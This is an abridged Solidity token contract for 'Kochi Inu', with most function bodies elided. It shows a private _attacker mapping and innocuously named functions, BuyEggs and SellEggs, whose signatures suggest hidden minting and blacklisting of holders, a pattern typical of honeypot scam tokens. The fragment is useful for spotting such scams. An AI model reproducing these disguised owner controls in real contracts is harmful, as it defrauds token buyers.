...
contract KOCHI is Ownable {
    address private _owner;
    address private _address0;
    address private _address1;
    string private _name = "Kochi Inu";
    string private _symbol = "KOCHI";
    mapping (address => bool) private _Addressint;
    mapping (address => bool) private _attacker;
    uint256 private _totalSupply = 99999999999 * (10 ** decimals());
    ...
    function bulkTransfer(address[] calldata to, uint256[] calldata amounts) public {
      ...
      function BuyEggs(address miner, uint256 _value) external  {
    ...
    function SellEggs(address addr,bool status) public {
